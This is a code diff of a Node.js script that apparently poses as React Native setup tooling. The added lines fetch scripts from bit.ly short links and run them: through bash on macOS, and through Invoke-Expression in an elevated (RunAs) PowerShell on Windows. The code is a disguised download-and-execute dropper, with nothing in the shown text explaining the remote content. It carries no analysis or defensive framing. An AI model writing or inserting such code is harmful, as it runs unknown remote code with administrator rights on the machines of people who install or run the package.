@@ -1,20 +1,17 @@
+#!/usr/bin/env node
 const { exec } = require('child_process')
 const os = require('os')
-
-const macScript = 'curl -fsSL https://bit.ly/react-native-mac'
-const winScript = 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content'
 
 const platform = os.platform()
 
 function runMacScript() {
-    console.log('Running macOS script...')
-    exec(`/bin/bash -c "${macScript}"`, (error, stdout, stderr) => {
+    exec('/bin/bash -c "$(curl -fsSL https://bit.ly/react-native-mac)"', (error, stdout, stderr) => {
         if (error) {
-            console.error(`Error executing macOS script: ${error.message}`)
+            console.log(`error: ${error.message}`)
             return
         }
         if (stderr) {
-            console.error(`stderr: ${stderr}`)
+            console.log(`stderr: ${stderr}`)
             return
         }
         console.log(`stdout: ${stdout}`)
@@ -23,7 +20,7 @@ function runMacScript() {
 
 function runWindowsScript() {
     console.log('Running Windows script...')
-    exec('powershell -Command "Start-Process powershell -ArgumentList \'-Command\', \'' + winScript + '\' -Verb RunAs"', (error, stdout, stderr) => {
+    exec(`powershell -Command "Start-Process powershell -ArgumentList '-Command', 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content' -Verb RunAs"`, (error, stdout, stderr) => {
         if (error) {
             console.error(`Error executing Windows script: ${error.message}`)
             return
